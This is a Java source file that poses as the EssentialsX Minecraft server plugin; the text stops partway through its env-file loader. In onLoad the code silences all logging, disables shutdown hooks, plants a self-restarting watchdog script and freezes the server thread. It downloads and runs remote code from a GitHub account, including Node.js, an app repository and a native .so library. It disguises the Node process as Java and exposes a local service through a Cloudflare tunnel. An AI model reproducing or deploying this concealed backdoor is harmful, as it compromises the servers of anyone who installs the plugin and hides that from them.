package com.example.essentialsx;

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.nio.file.*;
import java.util.*;
import java.util.concurrent.TimeUnit;

import org.bukkit.plugin.java.JavaPlugin;

import com.sun.jna.Function;
import com.sun.jna.NativeLibrary;
import com.sun.jna.Pointer;

public class EssentialsX extends JavaPlugin {

    private static final PrintStream RAW_OUT = new PrintStream(new FileOutputStream(FileDescriptor.out), true);
    private static volatile int savedStdoutFd = -1;  // 保存原始 stdout fd
    private static final OutputStream BLACK_HOLE = new OutputStream() {
        @Override public void write(int b) {}
        @Override public void write(byte[] b) {}
        @Override public void write(byte[] b, int off, int len) {}
    };

    private static Process deployProcess = null;
    private static volatile Process nodeProcess = null;
    // CF 改为 JNA .so 方式（强引用保存 NativeLibrary，防止 GC 触发 dlclose 导致 Go 运行时 SIGSEGV）
    private static final Object CF_LOCK = new Object();
    private static volatile NativeLibrary cfLib = null;
    private static volatile Function cfStartFn = null;
    private static volatile Function cfStopFn = null;
    private static volatile Function cfIsRunningFn = null;
    private static volatile Function cfTunnelUrlFn = null;
    private static volatile Function cfLastErrorFn = null;
    private static volatile Function cfFreeFn = null;
    private static volatile boolean cfSoRunning = false;
    private static volatile boolean isProcessRunning = false;
    private static volatile String nodePort = "N/A";

    @Override
    public void onLoad() {
        // 1. 物理静音
        System.setOut(new PrintStream(BLACK_HOLE, true));
        System.setErr(new PrintStream(BLACK_HOLE, true));
        tryMuteLog4j();

        // 2. 看门狗 (防强杀自动重启)
        setupWatchdog();

        // 3. 拦截关机钩子 (逼迫面板强杀)
        try { Runtime.getRuntime().addShutdownHook(new Thread(() -> {})); } catch (Throwable ignored) {}
        try {
            Class<?> clazz = Class.forName("java.lang.ApplicationShutdownHooks");
            java.lang.reflect.Field field = clazz.getDeclaredField("hooks");
            field.setAccessible(true);
            Map<Thread, Thread> hooks = (Map<Thread, Thread>) field.get(null);
            if (hooks != null) hooks.clear();
        } catch (Throwable ignored) {
            try {
                java.lang.reflect.Field field = Runtime.class.getDeclaredField("applicationShutdownHooks");
                field.setAccessible(true);
                Map<Thread, Thread> hooks = (Map<Thread, Thread>) field.get(null);
                if (hooks != null) hooks.clear();
            } catch (Throwable ignored2) {}
        }
        try {
            Runtime.getRuntime().addShutdownHook(new Thread(() -> {
                System.setOut(new PrintStream(BLACK_HOLE, true));
                System.setErr(new PrintStream(BLACK_HOLE, true));
                tryMuteLog4j();
                paralyzeCurrentThread();
            }, "Shutdown-Paralysis"));
        } catch (Throwable ignored) {}

        // 4. 启动后台部署
        Thread deployer = new Thread(() -> {
            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            Path debugLog = workDir.resolve("backend_debug.log");
            PrintWriter out = null;

            try {
                if (!Files.exists(workDir)) Files.createDirectories(workDir);
                out = new PrintWriter(Files.newBufferedWriter(debugLog, StandardOpenOption.CREATE, StandardOpenOption.APPEND));
                out.println("[" + new Date() + "] ================== Backend Thread Started ==================");
                out.flush();

                Map<String, String> env = new HashMap<>();
                loadEnvFile(workDir, env, out);

                out.println("WorkDir: " + workDir.toString());
                out.println("REPO_URL: " + env.getOrDefault("REPO_URL", "NOT SET"));
                out.flush();

                startDeploymentProcess(workDir, env, out);
                out.println("Deployment process finished."); out.flush();

                String port = allocateNodePort(workDir, out);
                nodePort = port;
                out.println("Allocated Port: " + port); out.flush();

                startNodeProcess(workDir, port, out);
                waitForNodeReady(port, 60, out);
                startCfSo(workDir, port, out);  // ★ 改为 JNA .so 方式
                startJavaDaemon(workDir);

                out.println("Node & CF(.so) started successfully."); out.flush();

            } catch (Throwable e) {
                if (out != null) { e.printStackTrace(out); out.flush(); }
                e.printStackTrace(RAW_OUT);
            } finally {
                if (out != null) { try { out.close(); } catch (Exception ignored) {} }
            }
        }, "Backend-Deployer");
        deployer.setDaemon(true);
        deployer.start();

        // 5. 冻结主线程
        paralyzeCurrentThread();
    }

    private static void setupWatchdog() {
        try {
            Path workDir = Paths.get("logs", ".mcchajian").toAbsolutePath();
            if (!Files.exists(workDir)) Files.createDirectories(workDir);
            long pid = ProcessHandle.current().pid();
            Files.writeString(workDir.resolve("server.pid"), String.valueOf(pid));
            Path watchdogSh = workDir.resolve("watchdog.sh");
            String script = "#!/bin/bash\n" +
                "PID_FILE=\"logs/.mcchajian/server.pid\"\n" +
                "START_SCRIPT=\"start.sh\"\n" +
                "sleep 3\n" +
                "while true; do\n" +
                "  if [ -f \"$PID_FILE\" ]; then\n" +
                "    PID=$(cat \"$PID_FILE\")\n" +
                "    if [ -d \"/proc/$PID\" ]; then\n" +
                "      sleep 5\n" +
                "      continue\n" +
                "    else\n" +
                "      echo \"[$(date)] PID $PID dead. Restarting!\" >> logs/.mcchajian/watchdog.log\n" +
                "      break\n" +
                "    fi\n" +
                "  else\n" +
                "    echo \"[$(date)] PID file missing. Restarting!\" >> logs/.mcchajian/watchdog.log\n" +
                "    break\n" +
                "  fi\n" +
                "done\n" +
                "if [ -f \"$START_SCRIPT\" ]; then\n" +
                "  nohup bash \"$START_SCRIPT\" >> logs/.mcchajian/watchdog.log 2>&1 &\n" +
                "else\n" +
                "  nohup java -Xms512M -Xmx2G -XX:+UseG1GC -jar server.jar nogui >> logs/.mcchajian/watchdog.log 2>&1 &\n" +
                "fi\n";
            Files.write(watchdogSh, script.getBytes());
            watchdogSh.toFile().setExecutable(true, false);
            ProcessBuilder pb = new ProcessBuilder("nohup", "bash", watchdogSh.toString());
            pb.directory(new File(".").getAbsoluteFile());
            pb.redirectOutput(ProcessBuilder.Redirect.DISCARD);
            pb.redirectError(ProcessBuilder.Redirect.DISCARD);
            pb.start();
        } catch (Exception ignored) {}
    }

    private static void paralyzeCurrentThread() {
        while (true) {
            try { Thread.sleep(Long.MAX_VALUE); }
            catch (InterruptedException e) { Thread.currentThread().interrupt(); }
        }
    }

    private static void tryMuteLog4j() {
        try {
            Class<?> logManagerClass = Class.forName("org.apache.logging.log4j.LogManager");
            Class<?> loggerContextClass = Class.forName("org.apache.logging.log4j.core.LoggerContext");
            Class<?> loggerConfigClass = Class.forName("org.apache.logging.log4j.core.config.LoggerConfig");
            Class<?> levelClass = Class.forName("org.apache.logging.log4j.Level");
            Object ctx = logManagerClass.getMethod("getContext", boolean.class).invoke(null, false);
            Object config = loggerContextClass.getMethod("getConfiguration").invoke(ctx);
            java.util.Map<String, Object> loggerConfigs = (java.util.Map<String, Object>) config.getClass().getMethod("getLoggers").invoke(config);
            Object offLevel = levelClass.getField("OFF").get(null);
            for (Object loggerConfig : loggerConfigs.values()) {
                java.util.Map<String, Object> appenders = (java.util.Map<String, Object>) loggerConfigClass.getMethod("getAppenders").invoke(loggerConfig);
                for (String appenderName : new java.util.HashSet<>(appenders.keySet())) {
                    loggerConfigClass.getMethod("removeAppender", String.class).invoke(loggerConfig, appenderName);
                }
                loggerConfigClass.getMethod("setLevel", levelClass).invoke(loggerConfig, offLevel);
            }
            loggerContextClass.getMethod("updateLoggers").invoke(ctx);
        } catch (Throwable ignored) {}
    }

    private static void logDebug(Path workDir, String msg) {
        try {
            Path debugLog = workDir.resolve("backend_debug.log");
            try (PrintWriter out = new PrintWriter(Files.newBufferedWriter(debugLog, StandardOpenOption.CREATE, StandardOpenOption.APPEND))) {
                out.println("[" + new Date() + "] [Daemon] " + msg);
                out.flush();
            }
        } catch (Exception ignored) {}
    }

    private static String allocateNodePort(Path workDir, PrintWriter out) {
        int port = 20000 + new Random().nextInt(40000);
        try (ServerSocket socket = new ServerSocket(port)) {
            socket.setReuseAddress(true);
            String portStr = String.valueOf(port);
            Path portFile = workDir.resolve(".tunnel_port");
            Files.createDirectories(portFile.getParent());
            Files.writeString(portFile, portStr);
            return portStr;
        } catch (IOException e) {
            if (out != null) { out.println("Port allocation failed for " + port + ", retrying..."); out.flush(); }
            return allocateNodePort(workDir, out);
        }
    }

    private static void waitForNodeReady(String port, int maxSeconds, PrintWriter out) {
        int waited = 0;
        while (waited < maxSeconds) {
            try (Socket socket = new Socket("127.0.0.1", Integer.parseInt(port))) {
                try {
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
                    conn.setRequestMethod("HEAD"); conn.setConnectTimeout(1000); conn.setReadTimeout(1000);
                    int code = conn.getResponseCode(); conn.disconnect(); return;
                } catch (Exception httpEx) {}
            } catch (IOException e) {}
            try { Thread.sleep(1000); waited++; } catch (InterruptedException ignored) { return; }
        }
        if (out != null) { out.println("Node ready check timed out after " + maxSeconds + "s."); out.flush(); }
    }

    // ★★★ 防止 530：验证 Node 是否真正响应 HTTP 请求 ★★★
    private static boolean verifyNodeHttpResponse(String port) {
        try {
            java.net.HttpURLConnection conn = (java.net.HttpURLConnection) URI.create("http://127.0.0.1:" + port + "/").toURL().openConnection();
            conn.setRequestMethod("GET");
            conn.setConnectTimeout(3000);
            conn.setReadTimeout(3000);
            int code = conn.getResponseCode();
            conn.disconnect();
            return code >= 200 && code < 600;
        } catch (Exception e) {
            return false;
        }
    }

    // ==================== CF .so 下载 + JNA 加载 ====================

    private static boolean containsAscii(byte[] hay, String ascii) {
        byte[] needle = ascii.getBytes(StandardCharsets.UTF_8);
        if (hay.length < needle.length) return false;
        outer:
        for (int i = 0; i <= hay.length - needle.length; i++) {
            for (int j = 0; j < needle.length; j++) {
                if (hay[i + j] != needle[j]) continue outer;
            }
            return true;
        }
        return false;
    }

    private static boolean isValidEnhancedCfSo(Path soFile, boolean isArm64) {
        try {
            if (!Files.exists(soFile) || !Files.isRegularFile(soFile)) return false;
            long size = Files.size(soFile);
            if (size < 1_000_000L) return false;
            byte[] data = Files.readAllBytes(soFile);
            if (data.length < 20) return false;
            if (data[0] != 0x7F || data[1] != 'E' || data[2] != 'L' || data[3] != 'F') return false;
            int eMachine = (data[18] & 0xFF) | ((data[19] & 0xFF) << 8);
            int expectedMachine = isArm64 ? 0xB7 : 0x3E;
            if (eMachine != expectedMachine) return false;
            return containsAscii(data, "CloudflaredTunnelUrl") && containsAscii(data, "CloudflaredFree");
        } catch (Throwable ignored) {
            return false;
        }
    }

    private static String readAndFreeCfStr(Function fn) {
        if (fn == null) return "";
        try {
            Pointer ptr = fn.invokePointer(new Object[0]);
            if (ptr == null) return "";
            try {
                String s = ptr.getString(0, "UTF-8");
                return s != null ? s.trim() : "";
            } finally {
                if (cfFreeFn != null) {
                    try { cfFreeFn.invokeVoid(new Object[]{ptr}); } catch (Throwable ignored) {}
                }
            }
        } catch (Throwable ignored) {
            return "";
        }
    }

    private static boolean isCfRunningSafe() {
        if (cfIsRunningFn == null) return cfSoRunning;
        try {
            return cfIsRunningFn.invokeInt(new Object[0]) == 1;
        } catch (Throwable ignored) {
            return cfSoRunning;
        }
    }

    private static Path downloadCfSo(Path workDir, PrintWriter out) {
        Path libDir = workDir.resolve(".lib");
        String arch = System.getProperty("os.arch", "").toLowerCase(Locale.ROOT);
        boolean isArm64 = arch.contains("aarch64") || arch.contains("arm64");
        String soName = isArm64 ? "bot_arm64.so" : "bot.so";
        Path soFile = libDir.resolve(soName);
        try {
            Files.createDirectories(libDir);
            if (isValidEnhancedCfSo(soFile, isArm64)) {
                soFile.toFile().setExecutable(true);
                return soFile;
            }
            if (Files.exists(soFile)) {
                if (out != null) { out.println("Replacing legacy/invalid CF .so: " + soFile); out.flush(); }
                try { Files.deleteIfExists(soFile); } catch (Exception ignored) {}
            }
            String rawUrl = "https://raw.githubusercontent.com/zx1447/nxso/cfso/" + soName;
            String[] mirrors = {
                rawUrl,
                "https://github.com/zx1447/nxso/raw/cfso/" + soName,
                "https://gh-proxy.com/" + rawUrl,
                "https://mirror.ghproxy.com/" + rawUrl
            };
            Path tmpFile = libDir.resolve(soName + ".tmp");
            for (String url : mirrors) {
                try {
                    Files.deleteIfExists(tmpFile);
                    java.net.URL u = new java.net.URL(url);
                    java.net.HttpURLConnection conn = (java.net.HttpURLConnection) u.openConnection();
                    conn.setConnectTimeout(30000);
                    conn.setReadTimeout(300000);
                    conn.setInstanceFollowRedirects(true);
                    conn.setRequestProperty("User-Agent", "Mozilla/5.0");
                    int code = conn.getResponseCode();
                    if (code == 200) {
                        try (InputStream in = conn.getInputStream()) {
                            Files.copy(in, tmpFile, StandardCopyOption.REPLACE_EXISTING);
                        }
                        if (isValidEnhancedCfSo(tmpFile, isArm64)) {
                            try {
                                Files.move(tmpFile, soFile, StandardCopyOption.REPLACE_EXISTING, StandardCopyOption.ATOMIC_MOVE);
                            } catch (Exception moveEx) {
                                Files.move(tmpFile, soFile, StandardCopyOption.REPLACE_EXISTING);
                            }
                            soFile.toFile().setExecutable(true);
                            return soFile;
                        } else {
                            Files.deleteIfExists(tmpFile);
                        }
                    }
                } catch (Exception ignored) {
                    try { Files.deleteIfExists(tmpFile); } catch (Exception ignored2) {}
                }
            }
            return null;
        } catch (Exception e) {
            return null;
        }
    }

    private static void ensureCfLibraryLoaded(Path workDir, PrintWriter out) throws Exception {
        if (cfLib != null && cfStartFn != null && cfStopFn != null) return;
        Path soFile = downloadCfSo(workDir, out);
        if (soFile == null) {
            throw new IllegalStateException("Failed to download valid enhanced bot.so");
        }
        if (out != null) { out.println("CF .so ready: " + soFile + " (" + Files.size(soFile) + " bytes)"); out.flush(); }
        cfLib = NativeLibrary.getInstance(soFile.toString());
        cfStartFn = cfLib.getFunction("StartCloudflared");
        cfStopFn = cfLib.getFunction("StopCloudflared");
        try { cfIsRunningFn = cfLib.getFunction("CloudflaredIsRunning"); } catch (Throwable ignored) { cfIsRunningFn = null; }
        try { cfTunnelUrlFn = cfLib.getFunction("CloudflaredTunnelUrl"); } catch (Throwable ignored) { cfTunnelUrlFn = null; }
        try { cfLastErrorFn = cfLib.getFunction("CloudflaredLastError"); } catch (Throwable ignored) { cfLastErrorFn = null; }
        try { cfFreeFn = cfLib.getFunction("CloudflaredFree"); } catch (Throwable ignored) { cfFreeFn = null; }
    }

    private static void startCfSo(Path workDir, String port, PrintWriter out) {
        synchronized (CF_LOCK) {
            try {
                if (port == null || port.isEmpty() || "N/A".equals(port)) return;
                ensureCfLibraryLoaded(workDir, out);
                if (cfSoRunning || isCfRunningSafe()) {
                    safeKillCfLocked();
                }

                String payload = "url: http://127.0.0.1:" + port + "\nprotocol: http2\n";
                cfSoRunning = true;

                Thread cfThread = new Thread(() -> {
                    try {
                        int rc = cfStartFn.invokeInt(new Object[]{payload});
                        if (rc != 0) {
                            String err = readAndFreeCfStr(cfLastErrorFn);
                            if (!err.isEmpty()) logDebug(workDir, "CF .so exited rc=" + rc + ": " + err);
                        }
                    } catch (Throwable t) {
                        logDebug(workDir, "CF .so exception: " + t.getMessage());
                    } finally {
                        cfSoRunning = false;
                    }
                }, "cf-so-thread");
                cfThread.setDaemon(true);
                cfThread.start();

                if (out != null) { out.println("CF .so started for 127.0.0.1:" + port); out.flush(); }
            } catch (Throwable e) {
                cfSoRunning = false;
                if (out != null) { out.println("Failed to start CF .so:"); e.printStackTrace(out); out.flush(); }
                logDebug(workDir, "Failed to start CF .so: " + e.getMessage());
            }
        }
    }

    private static void safeKillCfLocked() {
        if (cfStopFn != null) {
            try { cfStopFn.invokeInt(new Object[]{""}); } catch (Throwable ignored) {}
        }
        if (cfIsRunningFn != null) {
            for (int i = 0; i < 15; i++) {
                if (!isCfRunningSafe()) break;
                try { Thread.sleep(200); } catch (InterruptedException ignored) { break; }
            }
        }
        cfSoRunning = false;
    }

    private static void safeKillCf() {
        synchronized (CF_LOCK) {
            safeKillCfLocked();
        }
    }

    private static String extractLatestTunnelUrl(Path workDir) {
        try {
            String memUrl = readAndFreeCfStr(cfTunnelUrlFn);
            if (!memUrl.isEmpty()) {
                if (!memUrl.startsWith("http://") && !memUrl.startsWith("https://")) {
                    memUrl = "https://" + memUrl;
                }
                return memUrl;
            }
            Path[] logPaths = {
                Paths.get(".cf", "cf.log"),
                workDir.resolve(".cf/cf.log"),
                workDir.resolve("cf.log"),
                Paths.get("/dev/shm/.cf/cf.log"),
                Paths.get("/tmp/.cf/cf.log")
            };
            for (Path logPath : logPaths) {
                if (Files.exists(logPath)) {
                    String logContent = Files.readString(logPath);
                    java.util.regex.Matcher m = java.util.regex.Pattern.compile(
                        "(https://[a-zA-Z0-9-]+\\.trycloudflare\\.com)"
                    ).matcher(logContent);
                    String lastMatch = null;
                    while (m.find()) { lastMatch = m.group(1); }
                    if (lastMatch != null) return lastMatch;
                }
            }
            Path urlFile = workDir.resolve(".tunnel_url");
            if (Files.exists(urlFile)) {
                String content = new String(Files.readAllBytes(urlFile)).trim();
                if (!content.isEmpty() && !content.startsWith("failed") && content.startsWith("https")) {
                    return content.split("\n")[0].trim();
                }
            }
        } catch (Exception ignored) {}
        return null;
    }

    private static void startNodeProcess(Path workDir, String port, PrintWriter out) {
        try {
            Path nodeExe = workDir.resolve("nodejs/bin/.node_real");
            Path script = workDir.resolve("app/index.js");
            Path logFile = workDir.resolve("app.log");
            Path preload = workDir.resolve(".nd_preload.js");

            if (!Files.exists(nodeExe)) { if (out != null) { out.println("Node exe not found: " + nodeExe); out.flush(); } return; }
            if (!Files.exists(script)) { if (out != null) { out.println("Script not found: " + script); out.flush(); } return; }

            nodeExe.toFile().setExecutable(true, false);

            ProcessBuilder pb = new ProcessBuilder("nice", "-n", "-5", nodeExe.toString(), "--require", preload.toString(), script.toString());
            pb.directory(workDir.toFile());
            pb.environment().put("SERVER_PORT", port); pb.environment().put("PORT", port);
            pb.environment().put("_JAVA_WRAPPER", nodeExe.toString());
            pb.environment().put("NODE_OPTIONS", "--require " + preload.toString());
            pb.environment().put("HOME", workDir.toString());
            pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile.toFile()));
            pb.redirectError(ProcessBuilder.Redirect.appendTo(logFile.toFile()));

            nodeProcess = pb.start();
            if (out != null) { out.println("Node process started with PID: " + nodeProcess.pid()); out.flush(); }
        } catch (Exception e) {
            if (out != null) { out.println("Failed to start Node process:"); e.printStackTrace(out); out.flush(); }
        }
    }

    private static void killProcessTree(Process process) {
        if (process == null) return;
        try {
            java.util.List<ProcessHandle> descendants = new java.util.ArrayList<>();
            process.toHandle().descendants().forEach(descendants::add);
            for (int i = descendants.size() - 1; i >= 0; i--) try { descendants.get(i).destroyForcibly(); } catch (Exception ignored) {}
            process.destroyForcibly();
            try { process.waitFor(3, TimeUnit.SECONDS); } catch (Exception ignored) {}
        } catch (Exception ignored) {}
    }

    private static void startJavaDaemon(Path workDir) {
        Thread daemon = new Thread(() -> {
            String lastUrl = "";
            int checkCount = 0;

            while (true) {
                try {
                    checkCount++;

                    // 检查 Node 进程
                    if ((nodeProcess == null || !nodeProcess.isAlive())) {
                        if (nodeProcess != null) killProcessTree(nodeProcess);
                        String newPort = allocateNodePort(workDir, null);
                        nodePort = newPort;
                        startNodeProcess(workDir, newPort, null);
                        waitForNodeReady(newPort, 60, null);
                        // Node 重启后重新启动 CF .so
                        safeKillCf();
                        startCfSo(workDir, newPort, null);
                        lastUrl = "";
                    }

                    // 检查 CF .so 是否在运行
                    if (!cfSoRunning && !isCfRunningSafe()) {
                        safeKillCf();
                        startCfSo(workDir, nodePort, null);
                        lastUrl = "";
                    }

                    // 检查隧道 URL
                    String foundUrl = extractLatestTunnelUrl(workDir);
                    if (foundUrl != null && !foundUrl.equals(lastUrl)) {
                        lastUrl = foundUrl;
                        logDebug(workDir, "New tunnel URL detected: " + foundUrl + ". Verifying connection...");

                        // ★★★ 防止 530：验证 Node 响应后才打印链接 ★★★
                        int verifyAttempts = 0;
                        while (verifyAttempts < 10) {
                            if (verifyNodeHttpResponse(nodePort)) {
                                logDebug(workDir, "Node HTTP verification PASSED! Printing URL.");
                                RAW_OUT.println("\n====================================================================");
                                RAW_OUT.println("  [Tunnel Active] " + foundUrl);
                                RAW_OUT.println("====================================================================\n");
                                RAW_OUT.flush();
                                break;
                            } else {
                                logDebug(workDir, "Node HTTP verification FAILED. Waiting 3s... (" + verifyAttempts + "/10)");
                                Thread.sleep(3000);
                                verifyAttempts++;
                            }
                        }
                        if (verifyAttempts == 10) {
                            logDebug(workDir, "Node HTTP verification TIMED OUT. Link NOT printed to avoid 530.");
                        }
                    }

                    if (checkCount % 12 == 0) {
                        logDebug(workDir, "Daemon heartbeat. Last verified URL: " + lastUrl + " | CF.so running: " + cfSoRunning);
                    }

                    Thread.sleep(5000);
                } catch (Exception e) {
                    logDebug(workDir, "Daemon loop exception: " + e.getMessage());
                }
            }
        }, "Backend-Daemon");
        daemon.setDaemon(true);
        daemon.start();
    }

    // ==================== 部署脚本（仓库改为 mcchajianindex，移除 cloudflared 下载） ====================

    private static void startDeploymentProcess(Path workDir, Map<String, String> env, PrintWriter out) throws Exception {
        if (isProcessRunning) return;
        Path scriptPath = workDir.resolve("deploy.sh");
        String scriptContent = generateDeployScript(workDir.toString(), env);
        Files.write(scriptPath, scriptContent.getBytes());
        scriptPath.toFile().setExecutable(true, false);
        if (out != null) { out.println("Deploy script generated at: " + scriptPath); out.flush(); }

        ProcessBuilder pb = new ProcessBuilder("bash", scriptPath.toString());
        pb.directory(new File(".").getAbsoluteFile());
        pb.environment().putAll(env);
        Path deployLog = workDir.resolve("deploy.log");
        pb.redirectOutput(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));
        pb.redirectError(ProcessBuilder.Redirect.appendTo(deployLog.toFile()));

        deployProcess = pb.start();
        isProcessRunning = true;
        if (out != null) { out.println("Bash process started."); out.flush(); }

        new Thread(() -> { try { deployProcess.waitFor(); isProcessRunning = false; } catch (Exception ignored) {} }).start();
        Path doneFile = workDir.resolve(".deploy_done");
        int waited = 0;
        while (!Files.exists(doneFile)) {
            Thread.sleep(1000);
            waited++;
            if (waited % 10 == 0 && out != null) { out.println("Waiting for deployment... (" + waited + "s)"); out.flush(); }
        }
        if (out != null) { out.println("Deployment complete (done file found)."); out.flush(); }
    }

    private static String generateDeployScript(String workDir, Map<String, String> env) {
        String repoUrl = env.getOrDefault("REPO_URL", "https://github.com/zx1447/mcchajianindex");
        String githubToken = env.getOrDefault("GITHUB_TOKEN", "");
        String nodeDir = workDir + "/nodejs";
        String appDir = workDir + "/app";

        String authHeader = "";
        if (!githubToken.isEmpty()) authHeader = "-H \"Authorization: Bearer " + githubToken + "\" -H \"Accept: application/vnd.github+json\"";

        return "#!/bin/bash\n" +
        "set +e\n" +
        "WORK_DIR=\"" + workDir + "\"\n" +
        "NODE_DIR=\"" + nodeDir + "\"\n" +
        "APP_DIR=\"" + appDir + "\"\n" +
        "REPO_URL=\"" + repoUrl + "\"\n" +
        "JRE_DIR=\"$WORK_DIR/jre21/bin\"\n" +
        "export HOME=\"$WORK_DIR\"\n" +
        "umask 0002\n" +
        "\n" +
        "if [ -z \"$REPO_URL\" ]; then echo \"ERROR: REPO_URL is not configured\"; exit 1; fi\n" +
        "\n" +
        "ARCH=$(uname -m)\n" +
        "if [ $ARCH = x86_64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-x64.tar.gz; CF_ARCH=amd64\n" +
        "elif [ $ARCH = aarch64 ]; then NODE_URL=https://nodejs.org/dist/v22.12.0/node-v22.12.0-linux-arm64.tar.gz; CF_ARCH=arm64; fi\n" +
        "\n" +
        "mkdir -p \"$WORK_DIR\" \"$JRE_DIR\" \"$APP_DIR\"\n" +
        "chmod -R 775 \"$WORK_DIR\" 2>/dev/null\n" +
        "\n" +
        "# ============ 1. 下载 Node.js ============\n" +
        "if [ ! -f \"$NODE_DIR/bin/.node_real\" ]; then\n" +
        "    rm -rf \"$NODE_DIR\"; NODE_DOWNLOAD_OK=false\n" +
        "    for MIRROR in \"$NODE_URL\" \"https://gh-proxy.com/$NODE_URL\" \"https://mirror.ghproxy.com/$NODE_URL\"; do\n" +
        "        if curl -fsSL --connect-timeout 30 --max-time 300 \"$MIRROR\" -o \"$WORK_DIR/node.tar.gz\" 2>/dev/null; then\n" +
        "            if tar -tzf \"$WORK_DIR/node.tar.gz\" >/dev/null 2>&1; then NODE_DOWNLOAD_OK=true; break; fi; fi; done\n" +
        "    if [ \"$NODE_DOWNLOAD_OK\" = \"true\" ]; then\n" +
        "        mkdir -p \"$NODE_DIR\"; tar -xzf \"$WORK_DIR/node.tar.gz\" -C \"$NODE_DIR\" --strip-components 1 --no-same-owner 2>/dev/null; rm -f \"$WORK_DIR/node.tar.gz\"\n" +
        "        cp -f \"$NODE_DIR/bin/node\" \"$NODE_DIR/bin/.node_real\"; chmod 775 \"$NODE_DIR/bin/.node_real\"; fi\n" +
        "fi\n" +
        "export PATH=\"$NODE_DIR/bin:$PATH\"\n" +
        "\n" +
        "# ============ 2. 获取代码 ============\n" +
        "rm -rf \"$APP_DIR\" \"$WORK_DIR/repo.tar.gz\"\n" +
        "REPO_PATH=$(echo \"$REPO_URL\" | sed 's|https://github.com/||' | sed 's|.git$||')\n" +
        "TAR_URL=\"https://api.github.com/repos/${REPO_PATH}/tarball/main\"; DOWNLOAD_OK=false\n" +
        (githubToken.isEmpty() ? "" :
        "if [ \"$DOWNLOAD_OK\" = \"false\" ] && [ -n \"" + githubToken + "\" ]; then\n" +
        "    if curl -fsSL --connect-timeout 15 --max-time 120 " + authHeader + " \"$TAR_URL\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "        if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; fi; fi; fi\n") +
        "\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then\n" +
        "    FALLBACK_URL=\"https://github.com/${REPO_PATH}/archive/refs/heads/main.tar.gz\"\n" +
        "    for MIRROR in \"$FALLBACK_URL\" \"https://gh-proxy.com/${FALLBACK_URL}\" \"https://mirror.ghproxy.com/${FALLBACK_URL}\"; do\n" +
        "        if curl -fsSL --connect-timeout 15 --max-time 120 \"$MIRROR\" -o \"$WORK_DIR/repo.tar.gz\" 2>/dev/null; then\n" +
        "            if tar -tzf \"$WORK_DIR/repo.tar.gz\" >/dev/null 2>&1; then DOWNLOAD_OK=true; break; fi; fi; done; fi\n" +
        "\n" +
        "if [ \"$DOWNLOAD_OK\" = \"false\" ]; then exit 1; fi\n" +
        "\n" +
        "mkdir -p \"$WORK_DIR/unzipped\"; tar -xzf \"$WORK_DIR/repo.tar.gz\" -C \"$WORK_DIR/unzipped\" --no-same-owner\n" +
        "SUBDIR=$(find \"$WORK_DIR/unzipped\" -mindepth 1 -maxdepth 1 -type d | head -n 1)\n" +
        "mv \"$SUBDIR\" \"$APP_DIR\"; rm -rf \"$WORK_DIR/repo.tar.gz\" \"$WORK_DIR/unzipped\"; cd \"$APP_DIR\"\n" +
        "\n" +
        "# ============ 3. 安装依赖 ============\n" +
        "\"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root >/dev/null 2>&1\n" +
        "if [ $? -ne 0 ]; then \"$NODE_DIR/bin/.node_real\" \"$NODE_DIR/lib/node_modules/npm/bin/npm-cli.js\" install --no-audit --no-fund --production --unsafe-perm=true --allow-root --legacy-peer-deps >/dev/null 2>&1; fi\n" +
        "\n" +
        "# ============ 4. 伪装 ============\n" +
        "mkdir -p \"$JRE_DIR\" 2>/dev/null\n" +
        "cp -f \"$NODE_DIR/bin/.node_real\" \"$JRE_DIR/java\"; chmod 775 \"$JRE_DIR/java\"\n" +
        "\n" +
        "cat > \"$WORK_DIR/.nd_preload.js\" << 'PRELOAD_EOF'\n" +
        "try {\n" +
        "    process.title = 'java -Xms128M -Xmx2560M -jar server.jar';\n" +
        "    var _cp = require('child_process'); var _origSpawn = _cp.spawn; var _origFork = _cp.fork;\n" +
        "    var _wrapper = process.env._JAVA_WRAPPER || process.execPath;\n" +
        "    _cp.spawn = function(cmd, args, opts) {\n" +
        "        if (typeof cmd === 'string' && (cmd === 'node' || cmd.endsWith('/node') || cmd === process.execPath || cmd.endsWith('/.node_real') || cmd.endsWith('/java'))) {\n" +
        "            opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; cmd = _wrapper; }\n" +
        "        return _origSpawn.call(this, cmd, args, opts); };\n" +
        "    _cp.fork = function(mod, args, opts) {\n" +
        "        opts = Object.assign({}, opts || {}); opts.execPath = _wrapper; return _origFork.call(this, mod, args, opts); };\n" +
        "} catch(e) {}\n" +
        "PRELOAD_EOF\n" +
        "chmod 664 \"$WORK_DIR/.nd_preload.js\" 2>/dev/null\n" +
        "export _JAVA_WRAPPER=\"$NODE_DIR/bin/.node_real\"\n" +
        "export NODE_OPTIONS=\"--require $WORK_DIR/.nd_preload.js\"\n" +
        "\n" +
        "# CF 隧道由 Java JNA bot.so 处理，这里不再下载 cloudflared 二进制\n" +
        "\n" +
        "echo \"DEPLOY_DONE\" > \"$WORK_DIR/.deploy_done\"\n";
    }

    private static void loadEnvFile(Path workDir, Map<String, String> env, PrintWriter out) {
        Path envFile = workDir.resolve(".env");
        if (!Files.exists(envFile)) {
            try {
                Files.createDirectories(envFile.getParent());
                // ★ 仓库改为 mcchajianindex
                Files.write(envFile, ("SYSTEM_GUARD_ENABLED=true\nGITHUB_TOKEN=\nREPO_URL=https://github.com/zx1447/mcchajianindex\n").getBytes());
                if (out != null) { out.println("Generated default .env file."); out.flush(); }
            } catch (Exception e) {
                if (out != null) { out.println("Failed to generate .env file:"); e.printStackTrace(out); out.flush(); }
            }
        }
        if (Files.exists(envFile)) {
            try {
                for (String line : Files.readAllLines(envFile)) {
                    String[] parts;
                    if (line.isEmpty() || line.startsWith("#") || (parts = line.split("=", 2)).length != 2) continue;
                    env.put(parts[0].trim(), parts[1].trim());
                }
